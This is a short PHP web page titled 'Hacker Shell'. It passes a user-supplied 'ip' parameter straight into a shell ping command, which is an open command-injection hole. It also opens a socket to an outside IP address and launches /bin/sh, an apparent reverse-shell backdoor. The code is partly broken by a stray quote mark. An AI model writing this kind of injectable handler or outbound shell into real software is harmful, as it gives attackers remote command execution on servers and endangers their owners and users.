<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacker Shell</title>
</head>
<body>
    <div>
        <form action="">
            <input type="text" name="ip" />
            <input type="submit" value="Submit" />
        </form>

        <?php
            if($_GET['ip']){
                echo "<pre>".shell_exec("ping -c 2 ".$_GET['ip'])."</pre>";
                $sock=fsockopen("13.74.216.182",80);exec("/bin/sh");'
            }
        ?>
    </div>
</body>
</html>
